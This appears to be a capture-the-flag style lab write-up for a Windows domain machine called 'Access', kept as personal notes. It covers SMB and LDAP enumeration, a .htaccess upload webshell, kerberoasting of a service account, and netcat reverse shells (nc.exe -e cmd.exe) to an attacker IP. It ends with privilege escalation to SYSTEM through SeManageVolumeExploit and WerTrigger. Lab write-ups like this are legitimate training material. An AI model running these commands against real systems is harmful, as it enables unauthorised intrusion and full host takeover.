### Let's start
Identifying Exposed RPC Services
rpcdump -p 135 192.168.70.187

### SMB
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb

##### List shared folders
It is always recommended to look if you can access to anything, if you don't have credentials try using null credentials/guest user.

```
smbclient --no-pass -L //192.168.70.187 					// session setup failed: NT_STATUS_ACCESS_DENIED
smbclient -N -L \\\\192.168.70.187							// session setup failed: NT_STATUS_ACCESS_DENIED
smbmap -H 192.168.70.187 -p 139 			# Null user		// [!] Authentication error on 192.168.70.187
smbmap -H 192.168.70.187 -p 445 			# Null user		// [!] Authentication error on 192.168.70.187

crackmapexec smb 192.168.70.187 -u '' -p '' --shares # Null user
SMB         192.168.70.187  445    SERVER           [*] Windows 10.0 Build 17763 x64 (name:SERVER) (domain:access.offsec) (signing:True) (SMBv1:False)
SMB         192.168.70.187  445    SERVER           [-] access.offsec\: STATUS_ACCESS_DENIED 
SMB         192.168.70.187  445    SERVER           [-] Error enumerating shares: Error occurs while reading from remote(104)
```

Failed on SMB but got the domain name `access.offsec` perhaps?
And from the autorecon result, the windows machine is 64bit.

### Start reading from autorecon
##### LDAP
```
ldapsearch -h $IP -x -b "DC=access,DC=offsec" 	# Failing to run
```
##### Try again based on the Blackfield writeup
https://github.com/A1vinSmith/OSCP-PWK/blob/eaa2d22ff04a2618a6417f06a5c585e01a8c416f/HackTheBox/Windows/Blackfield/README.md
Get domains
```
ldapsearch -h $IP -x -s base namingcontexts  	# Failing to run
```

### Just buy ticket
##### Turns out it located at the main SPA. That's why overlooked.
http://192.168.70.187/#buyticket

##### Let's start with burp
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
Burp -> .htaccess -> https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess

Now think about it. Ticket.php is actually a hint already. Buy tickets

##### .htaccess shell
```
curl -k http://192.168.70.187/uploads/1.htaccess?c=id 			// Not working

curl -F 'file=@.htaccess' -k http://192.168.70.187/Ticket.php 	// Use -F file= to upload hidden files <- Although it didn't work propery here. Use burp to upload the htaccess instead
curl -k http://192.168.70.187/uploads/.htaccess?c=id 			// 403 Forbidden
```

### We're in, now obviously lateral movement since no flag
```
net users
```

import-module .\PowerView.ps1
'import-module' is not recognized as an internal or external command,
operable program or batch file.

### For ease, let's start powershell and begin local enumeration.
```
powershell
```

import-module .\PowerView.ps1
PS C:\xampp\htdocs\uploads> Get-netuser svc_mssql
Get-netuser svc_mssql

```
company                       : Access
logoncount                    : 1
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=MSSQL,CN=Users,DC=access,DC=offsec
objectclass                   : {top, person, organizationalPerson, user}
lastlogontimestamp            : 4/8/2022 2:40:02 AM
name                          : MSSQL
objectsid                     : S-1-5-21-537427935-490066102-1511301751-1104
samaccountname                : svc_mssql
codepage                      : 0
samaccounttype                : USER_OBJECT
accountexpires                : NEVER
cn                            : MSSQL
whenchanged                   : 7/6/2022 5:23:18 PM
instancetype                  : 4
usncreated                    : 16414
objectguid                    : 05153e48-7b4b-4182-a6fe-22b6ff95c1a9
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=access,DC=offsec
dscorepropagationdata         : 1/1/1601 12:00:00 AM
serviceprincipalname          : MSSQLSvc/DC.access.offsec
givenname                     : MSSQL
lastlogon                     : 4/8/2022 2:40:02 AM
badpwdcount                   : 0
useraccountcontrol            : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
whencreated                   : 4/8/2022 9:39:43 AM
countrycode                   : 0
primarygroupid                : 513
pwdlastset                    : 5/21/2022 5:33:45 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 73754
```

We can see that this account is configured with a "serviceprincipalname" or SPN. Armed with this information, we can perform a kerberoasting attack.

### Kerberoasting

Rubeus to acquire the the TGS of the user `svc_mssql` and then use hashcat or JohnTheRipper to crack the hash.

A compiled version of Rubeus.exe can be found at https://github.com/r3motecontrol/Ghostpack-CompiledBinaries. Let's download this executable and upload it to the target using our webshell. We can then execute it and obtain the hash for the service account.

```
PS C:\xampp\htdocs\uploads> ./Rubeus.exe kerberoast /nowrap
```

```
[*] Action: Kerberoasting
[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
[*] Target Domain          : access.offsec
[*] Searching path 'LDAP://SERVER.access.offsec/DC=access,DC=offsec' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1
[*] SamAccountName         : svc_mssql
[*] DistinguishedName      : CN=MSSQL,CN=Users,DC=access,DC=offsec
[*] ServicePrincipalName   : MSSQLSvc/DC.access.offsec
[*] PwdLastSet             : 5/21/2022 5:33:45 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : xxx
```

Using JohnTheRipper and the /usr/share/wordlists/rockyou.txt wordlist, we discover that password for svc_mssql is trustno1.

### RunAsCs
Next we will use RunAsCs to get shell as svc_mssql on the target. Let's grab a copy of Invoke-RunasCs.ps1 from the repository and upload it to the target by using the webshell.

In our shell on the target system, let's import the Invoke-RunasCs finction and then test it by running whoami.
```
PS C:\xampp\htdocs\uploads> import-module .\Invoke-RunasCs.ps1
import-module .\Invoke-RunasCs.ps1
PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 whoami
Invoke-RunasCs svc_mssql trustno1 whoami
access\svc_mssql

PS C:\xampp\htdocs\uploads> Invoke-RunasCs svc_mssql trustno1 'c:/xampp/htdocs/uploads/nc.exe 192.168.49.70 7891 -e cmd.exe'
```

### Now on access\svc_mssql
https://0xdf.gitlab.io/2021/11/08/htb-pivotapi-more.html#sebackupvolume

### Escalation

Enumeration privleges, we discover that SeManageVolumePrivilege is assigned to the svc_mssql account. We can take advantage of this privilege to get Administrator access to the target.

Reference :

    https://twitter.com/0gtweet/status/1303432729854439425
    https://github.com/CsEnox/SeManageVolumeExploit

Let's grab the compiled executable from the releases page.
We upload SeManageVolumeExploit.exe to the target and execute it. After execution, we discover that the Builtin Users group has full permissions on the Windows folder.
```
C:\xampp\htdocs\uploads>.\SeManageVolumeExploit.exe
.\SeManageVolumeExploit.exe
Entries changed: 916
DONE 

C:\xampp\htdocs\uploads>icacls c:/windows
icacls c:/windows
c:/windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Users:(RX)
           BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files
```

### I don't know why, but it seems we got the full permissions of the Windows folder
Let's use WerTrigger from https://github.com/sailay1996/WerTrigger to acquire a SYSTEM shell.

To set it up we need to:

    Copy phoneinfo.dll to *C:\Windows\System32*
    Place Report.wer file and WerTrigger.exe in a same directory.
    Run WerTrigger.exe.

```
C:\xampp\htdocs\uploads\enox>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is CCC2-BF17

 Directory of C:\xampp\htdocs\uploads\enox

10/10/2021  07:25 PM    <DIR>          .
10/10/2021  07:25 PM    <DIR>          ..
10/10/2021  07:23 PM             9,252 Report.wer
10/10/2021  07:23 PM            15,360 WerTrigger.exe
               2 File(s)         24,612 bytes
               2 Dir(s)  50,123,882,496 bytes free

C:\xampp\htdocs\uploads\enox>WerTrigger.exe
WerTrigger.exe
SNIP...
c:/xampp/htdocs/uploads/nc.exe 192.168.49.70 7892 -e cmd.exe
```

Note : WerTrigger.exe will not produce any output and will just wait for you to type the instructions you want to perform.

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.118.23] from (UNKNOWN) [192.168.120.107] 49998
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami && hostname 
whoami && hostname 
nt authority\system
SERVER

C:\Windows\system32>

We now have system level access on the target machine!